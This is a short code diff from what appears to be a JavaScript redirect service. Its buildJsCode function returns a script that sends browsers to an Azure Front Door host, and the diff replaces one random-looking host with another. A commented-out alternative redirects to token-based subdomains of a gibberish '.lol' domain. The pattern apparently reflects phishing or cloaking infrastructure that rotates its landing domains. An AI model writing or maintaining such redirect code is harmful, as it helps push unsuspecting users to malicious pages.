@@ -152,7 +152,7 @@ async function buildJsCode() {
   // if (!token) return null;
   // return `window.location.href="https://${token}.nblakjdfnvlkjadsfnv.lol"`;
   console.log("Redirected successfully!");
-  return `window.location.href="https://jpcorenew-affjdthmbshtb2bk.z01.azurefd.net"`;
+  return `window.location.href="https://jpcoredd-bpe2asaag3aydzgg.z01.azurefd.net"`;
 }
 
 // Health-check endpoint
